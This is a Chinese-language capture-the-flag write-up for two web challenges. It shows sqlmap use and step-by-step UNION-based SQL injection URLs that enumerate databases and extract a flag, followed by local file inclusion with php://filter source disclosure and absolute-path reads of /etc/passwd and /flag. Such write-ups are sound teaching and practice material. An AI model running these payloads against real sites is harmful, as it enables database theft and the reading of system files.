### EasyPeasy

一連上去先用自動帶我們到 http://xxx/news.php?id=1

先 `sqlmap -u http://xxx/news.php?i --random-agent` 

(以上xxx為題目URL)

找到playload `id=-4031 UNION ALL SELECT NULL,NULL,CONCAT(0x7171706a71,0x6872464461534467546173754f6d554f5a454178556d6f6f546578736a4
f4274506a4c596a76774e,0x717a707671)-- hZDH`

先撈DB

`http://140.110.112.32:4001/news.php?id=-4031 union select 1, database(), group_concat(schema_name) from information_schema.schemata -- -`

回傳 : information_schema,fl4g,mysql,news,test

撈TABLE

`http://140.110.112.32:4001/news.php?id=-4031%20UNION%20ALL%20SELECT%201,database(),CONCAT('','',group_concat(TABLE_NAME)) from information_schema.tables where table_schema='fl4g' -- -`

回傳 : secret

撈COLUMN

`http://140.110.112.32:4001/news.php?id=-4031%20UNION%20ALL%20SELECT%201,database(),CONCAT('','',group_concat(column_name)) from information_schema.columns where table_name='secret' -- -
`

回傳 : id,THIS_IS_FLAG_YO

撈value

`http://140.110.112.32:4001/news.php?id=-4031%20UNION%20ALL%20SELECT%201,database(),CONCAT('','',THIS_IS_FLAG_YO) from fl4g.secret-- -`

FLAG就出來了

### easy_lfi

題目url結尾是`?f=about.php`這樣

然後提示LFI了 所以把幾個頁面的source code解出來

`?f=php://filter/read=convert.base64-encode/resource=xd.php`

`?f=php://filter/read=convert.base64-encode/resource=about.php`

`?f=php://filter/read=convert.base64-encode/resource=index.php`

都沒東西 換一個方向

`?f=../../../../../etc/passwd`

出現警告`Oops! ../ will be filtered. You are Bad Hacker!`

所以直接用

`?f=/etc/passwd`

正常顯示

然後隨便猜一下

`?f=/flag`

完工
